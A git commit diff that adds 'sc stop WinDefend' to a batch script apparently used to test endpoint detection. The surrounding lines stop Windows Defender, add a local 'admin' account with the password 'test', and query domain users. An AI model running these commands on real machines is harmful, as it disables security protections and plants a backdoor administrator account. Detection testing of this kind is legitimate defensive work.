3ef9dce5262ffdb95ceb01b2b7570a16e5b8b876
AhmetHan <han.ahmet@icloud.com>
2019-10-29 13:51:46 +0300

    Update EDR-Tester.bat

--- EDR-Tester.bat
+++ EDR-Tester.bat
@@ -64,6 +64,8 @@ net view
 ECHO ============================
 net stop windefend
 ECHO ============================
+sc stop WinDefend
+ECHO ============================
 net user admin test /add
 ECHO ============================
 net user admin /domain
